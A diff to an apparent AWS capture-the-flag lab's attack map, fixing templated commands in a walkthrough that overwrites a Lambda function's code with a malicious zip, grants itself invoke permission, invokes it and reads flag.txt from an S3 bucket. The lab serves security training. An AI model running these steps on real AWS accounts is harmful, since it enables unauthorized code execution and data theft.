@@ -79,9 +79,9 @@ attackMap:
         - description: "Update the Lambda function with the malicious payload"
           command: "aws lambda update-function-code --function-name pl-prod-lambda-005-to-bucket-target-lambda --zip-file fileb:///tmp/malicious_lambda.zip"
         - description: "Grant self-invocation permission via resource-based policy"
-          command: "aws lambda add-permission --function-name pl-prod-lambda-005-to-bucket-target-lambda --statement-id allow-self-invoke --action lambda:InvokeFunction --principal arn:aws:iam::{account_id}:user/pl-prod-lambda-005-to-bucket-starting-user"
+          command: "ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text) && aws lambda add-permission --function-name pl-prod-lambda-005-to-bucket-target-lambda --statement-id allow-self-invoke --action lambda:InvokeFunction --principal arn:aws:iam::${ACCOUNT_ID}:user/pl-prod-lambda-005-to-bucket-starting-user"
         - description: "Invoke the malicious Lambda and pass the target bucket name"
-          command: "aws lambda invoke --function-name pl-prod-lambda-005-to-bucket-target-lambda --payload '{\"bucket\": \"pl-prod-lambda-005-to-bucket-{account_id}-{suffix}\"}' /tmp/lambda-response.json && cat /tmp/lambda-response.json"
+          command: "TARGET_BUCKET=<target_bucket_name output from the player's Outputs tab> && aws lambda invoke --function-name pl-prod-lambda-005-to-bucket-target-lambda --payload \"{\\\"bucket\\\": \\\"${TARGET_BUCKET}\\\"}\" /tmp/lambda-response.json && cat /tmp/lambda-response.json"
 
     - from: target-lambda
       to: lambda-exec-role
@@ -106,4 +106,4 @@ attackMap:
         - description: "Capture the CTF flag from the invocation response"
           command: "cat /tmp/lambda-response.json"
         - description: "Alternatively, retrieve flag.txt directly once you control the execution role's actions"
-          command: "aws s3 cp s3://pl-prod-lambda-005-to-bucket-{account_id}-{suffix}/flag.txt -"
+          command: "aws s3 cp s3://${TARGET_BUCKET}/flag.txt -"
